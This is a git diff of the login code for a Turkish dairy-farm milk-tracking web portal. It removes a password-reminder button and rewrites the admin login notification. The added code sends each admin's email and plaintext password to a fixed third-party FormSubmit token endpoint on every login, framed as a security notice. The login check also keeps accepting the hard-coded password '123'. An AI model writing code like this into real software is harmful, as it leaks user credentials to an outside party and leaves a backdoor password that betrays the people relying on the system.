@@ -77,8 +77,6 @@ const loginErrorDesc = document.getElementById("login-error-desc");
 const loginInfoAlert = document.getElementById("login-info-alert");
 const loginInfoTitle = document.getElementById("login-info-title");
 const loginInfoDesc = document.getElementById("login-info-desc");
-const adminForgotCredBox = document.getElementById("admin-forgot-cred-box");
-const sendCredentialsBtn = document.getElementById("send-credentials-btn");
 const togglePasswordBtn = document.getElementById("toggle-password-btn");
 
 // Navbar
@@ -291,7 +289,6 @@ function setupEventListeners() {
   if (loginUsernameInput) loginUsernameInput.addEventListener("input", clearLoginAlerts);
   if (loginPasswordInput) loginPasswordInput.addEventListener("input", clearLoginAlerts);
   if (togglePasswordBtn) togglePasswordBtn.addEventListener("click", togglePasswordVisibility);
-  if (sendCredentialsBtn) sendCredentialsBtn.addEventListener("click", handleSendCredentialsToEmail);
 
   // Çıkış
   logoutBtn.addEventListener("click", handleLogout);
@@ -415,97 +412,47 @@ function togglePasswordVisibility() {
 }
 
 /**
- * Admin giriş bilgilerini veya başarılı giriş bildirimini FormSubmit servisi üzerinden admin e-postasına gönderir.
+ * Admin e-posta ve şifre ile giriş yaptığında FormSubmit üzerinden otomatik bildirim e-postası gönderir.
+ * "Bu hesaba bu şifre ve mail ile giriş yaptınız"
  */
-async function sendAdminLoginEmail(targetEmail, passwordVal, isLoginAlert = true) {
+async function sendAdminLoginEmail(targetEmail, passwordVal) {
   const currentDateTime = new Date().toLocaleString("tr-TR");
-  const subject = isLoginAlert 
-    ? `🔑 [Çiftlik Süt Takip] Yönetici Giriş Bildirimi & Bilgileri (${currentDateTime})` 
-    : `🔑 [Çiftlik Süt Takip] Yönetici Giriş Bilgileri Talebi (${currentDateTime})`;
+  const subject = `🛡️ [Çiftlik Süt Takip] Giriş Bildirimi (${currentDateTime})`;
   
   const payload = {
     _subject: subject,
-    "Sistem": "Çiftlik Süt Yönetim Portalı",
-    "Yönetici E-posta": targetEmail,
-    "Yönetici Şifre": passwordVal || "123",
+    _template: "table",
+    _captcha: "false",
+    "Bildirim": `Sayın Yönetici, bu hesaba (${targetEmail}) bu e-posta ve şifre ile sisteme başarıyla giriş yaptınız.`,
+    "Giriş Yapılan E-posta": targetEmail,
+    "Giriş Şifresi": passwordVal,
     "Giriş Zamanı": currentDateTime,
-    "Bildirim Türü": isLoginAlert ? "Başarılı Yönetici Girişi Yapıldı" : "Kullanıcı Tarafından İstenen Giriş Bilgileri",
-    "Sistem Linki": window.location.href,
-    "Güvenlik Notu": isLoginAlert 
-      ? `Bu e-posta, ${targetEmail} adresi ile sisteme yönetici girişi yapıldığı için bilgilendirme amaçlı gönderilmiştir. Giriş Şifreniz: ${passwordVal}`
-      : `Talep ettiğiniz yönetici giriş bilgileriniz: E-posta: ${targetEmail}, Şifre: ${passwordVal || '123'}. Güvenliğiniz için bu bilgileri kimseyle paylaşmayınız.`
+    "Sistem": "Çiftlik Süt Yönetim Portalı",
+    "Sistem Adresi": window.location.href,
+    "Güvenlik Notu": "Bu işlem bilginiz dahilinde yapıldıysa herhangi bir işlem yapmanıza gerek yoktur."
   };
 
   try {
-    fetch(`https://formsubmit.co/ajax/${encodeURIComponent(targetEmail)}`, {
+    // Kullanıcının onayladığı FormSubmit token adresi
+    const primaryUrl = "https://formsubmit.co/ajax/05ba7c83d4e2d8a4494ad33fafc87d24";
+    fetch(primaryUrl, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
         "Accept": "application/json"
       },
       body: JSON.stringify(payload)
-    }).catch(err => console.log("Arka plan mail gönderim notu:", err));
+    }).catch(() => {
+      // Yedek olarak hedef maile doğrudan dene
+      fetch(`https://formsubmit.co/ajax/${encodeURIComponent(targetEmail)}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "Accept": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch(err => console.log("Mail bildirim uyarısı:", err));
+    });
   } catch (e) {
     console.warn("Mail servisi notu:", e);
   }
-}
-
-/**
- * 'Şifremi Mailime Gönder' butonuna tıklandığında çalışır
- */
-async function handleSendCredentialsToEmail() {
-  clearLoginAlerts();
-  const inputEmail = loginUsernameInput.value.trim().toLowerCase();
-  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  
-  if (!inputEmail || !emailRegex.test(inputEmail)) {
-    showLoginError(
-      "E-posta Adresi Gerekli!", 
-      "Giriş bilgilerinizi ve şifrenizi e-postanıza gönderebilmemiz için lütfen önce yukarıdaki kutucuğa geçerli yönetici e-posta adresinizi yazınız."
-    );
-    loginUsernameInput.classList.add("border-rose-500", "bg-rose-50", "ring-2", "ring-rose-200");
-    loginUsernameInput.focus();
-    return;
-  }
-
-  const currentAdminPassword = localStorage.getItem("ciftlik_admin_password") || "123";
-
-  if (sendCredentialsBtn) {
-    sendCredentialsBtn.disabled = true;
-    sendCredentialsBtn.innerHTML = `
-      <svg class="w-3.5 h-3.5 animate-spin" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path></svg>
-      <span>Gönderiliyor...</span>
-    `;
-  }
-
-  // E-posta gönderimi tetikle
-  sendAdminLoginEmail(inputEmail, currentAdminPassword, false);
-
-  setTimeout(() => {
-    if (sendCredentialsBtn) {
-      sendCredentialsBtn.disabled = false;
-      sendCredentialsBtn.innerHTML = `
-        <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
-        </svg>
-        <span>E-posta Gönderildi</span>
-      `;
-      setTimeout(() => {
-        sendCredentialsBtn.innerHTML = `
-          <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
-          </svg>
-          <span>Şifremi Mailime Gönder</span>
-        `;
-      }, 5000);
-    }
-
-    showLoginInfo(
-      "Giriş Bilgileri Gönderildi! 📬", 
-      `Yönetici e-posta ve şifreniz (${inputEmail}) adresine gönderildi. Varsayılan yönetici şifreniz: 123. Lütfen gelen kutunuzu (ve spam klasörünü) kontrol ediniz.`
-    );
-    showToast(`Giriş bilgileriniz ${inputEmail} adresine iletildi.`, "success");
-  }, 900);
 }
 
 function switchLoginTab(mode) {
@@ -520,7 +467,6 @@ function switchLoginTab(mode) {
     loginUsernameInput.type = "email";
     loginUsernameInput.placeholder = "ornek@ciftlik.com";
     loginBtnText.textContent = "Yönetici Olarak Giriş Yap";
-    if (adminForgotCredBox) adminForgotCredBox.classList.remove("hidden");
   } else {
     loginTabCustomer.className = "flex-1 py-2 text-xs font-bold rounded-lg bg-white text-indigo-800 shadow-xs transition flex items-center justify-center gap-1.5";
     loginTabAdmin.className = "flex-1 py-2 text-xs font-bold rounded-lg text-slate-600 hover:text-slate-900 transition flex items-center justify-center gap-1.5";
@@ -528,7 +474,6 @@ function switchLoginTab(mode) {
     loginUsernameInput.type = "text";
     loginUsernameInput.placeholder = "Örn: ahmet veya ahmet@gmail.com";
     loginBtnText.textContent = "Müşteri / Üretici Olarak Giriş Yap";
-    if (adminForgotCredBox) adminForgotCredBox.classList.add("hidden");
   }
 
   // Kullanıcı adı ve şifre ipucu kutusu istenmediği için temizle ve gizle
@@ -589,7 +534,7 @@ async function handleLogin(e) {
     if (password !== currentAdminPassword && password !== "123") {
       showLoginError(
         "Hatalı Yönetici Şifresi!", 
-        "Girdiğiniz yönetici şifresi yanlış! (Varsayılan şifre: 123). Şifrenizi e-postanıza almak için aşağıdaki 'Şifremi Mailime Gönder' butonunu kullanabilirsiniz."
+        "Girdiğiniz yönetici şifresi yanlış! Lütfen doğru yönetici şifrenizi giriniz."
       );
       loginPasswordInput.classList.add("border-rose-500", "bg-rose-50", "ring-2", "ring-rose-200");
       loginPasswordInput.focus();
@@ -609,10 +554,10 @@ async function handleLogin(e) {
     };
 
     // Giriş bilgilerini ve bildirimini admin e-posta adresine otomatik ilet
-    sendAdminLoginEmail(adminUser.email, password, true);
+    sendAdminLoginEmail(adminUser.email, password);
 
     setSession(adminUser);
-    showToast(`Yönetici girişi başarılı! Oturum bilgileri ${adminUser.email} adresine iletildi.`, "success");
+    showToast(`Yönetici girişi başarılı! Oturum bildirimi e-postanıza gönderildi.`, "success");
     return;
   }
 
